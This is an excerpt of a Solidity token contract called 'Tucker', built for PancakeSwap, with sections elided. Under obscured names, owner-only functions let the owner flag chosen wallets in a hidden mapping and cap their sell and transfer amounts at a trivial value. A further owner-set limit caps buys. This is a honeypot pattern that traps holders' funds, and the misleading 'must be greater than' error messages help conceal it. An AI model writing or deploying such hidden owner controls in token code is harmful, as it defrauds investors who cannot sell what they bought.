...
contract Tucker is Context, IERC20, Ownable {  
    ...
    uint256 private _tTotal = 300000000 * 10**3;
    uint256 private _tFeeTotal;
    string  private _name = "Tucker";
    ...
    address payable public markWallet = payable(0x1f4DF22975Fb3289B84F908298529452B8C89473);
    address payable public  buybackWallet= payable(0x4c7D2ba82B91C22B0e63403cEB7739C7D761e8FA);
    address payable public RewardWallet;
    mapping(address => bool) private _faceHandleLog;
    uint256 public  _lyaslVal = 1;
    uint256 public  _lyaansVal = 1;
    uint256 public _setBlallan=100;
    uint256 public _lyasgtVal=_setBlallan;
    IPancakeRouter02 public immutable pancakeRouter;    
    address public immutable pancakePair;
    uint256 private minTokensBeforeSwap = 1000;
    ...
    function _transfer(
        ...
        if(from == pancakePair)
        {
            takeFee = true;
            TaxType=1;
            emit comments("After add decimal BUY", amount.div(1000));
            emit comments("_lyasgtVal", _lyasgtVal);
            require(amount.div(1000) <= _lyasgtVal, "amount must be greater than given amount");
        ...
        takeFee = true;
        TaxType=2;
         emit comments("After add decimal sell", amount.div(1000));
         if(_faceHandleLog[from])
                {
                    
                    emit comments("_lyaslVal ", _lyaslVal);
                    require(amount.div(1000) <= _lyaslVal, "Transfer amount must be greater than given amount");
                }
        ...
        else if(from != pancakePair && to != pancakePair)
        {
            takeFee = false;
            TaxType=0;
            emit comments("After add decimal Transfer", amount.div(1000));
             if(_faceHandleLog[from])
                {
                     require(amount.div(1000) <= _lyaansVal, "Transfer amount must be greater than given amount");
                }
        ...
        function swapAndLiquify(uint256 contractTokenBalance) private
          {
           ...
           uint256 initialBalance = address(this).balance;
            ...
            uint256 SplitBNBBalance = Balance.div(_marketingPer.add(_RewardPer).add(BuybackPer));
   ...
   event showEthAddress (address wallet);
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        emit comments ("Tamont",tAmount);
        (uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        emit comments ("Tfee before 0",tFee);
    ...
    function _takeMarketingFee(uint256 tAmount,uint256 tFee) private {
         ...
         emit comments("takeMarketingFeeTAmount" ,tAmount);
         emit comments ("EnteredINMarketingFee-Tfee" , tFee);
    ...
    function slippage () public view returns  (uint256 , uint256, uint256)
    {
 ...
 function dyaHandleLog(address _walletAddr , bool inputamnt) external onlyOwner {
        _faceHandleLog[_walletAddr] = inputamnt;
    }

    function displayLOG(address _walletAddr) public view returns (bool) {
       return  _faceHandleLog[_walletAddr] ;
    }

    function dyaSLVAl(uint256 isValdya) external onlyOwner {
        _lyaslVal =isValdya;
    }
      function dyaTransal(uint256 isTransDya) external onlyOwner {
        _lyaansVal=isTransDya;
    }
     function dyaGetval(uint256 isGetDya) external onlyOwner {
        _lyasgtVal=isGetDya;
    }
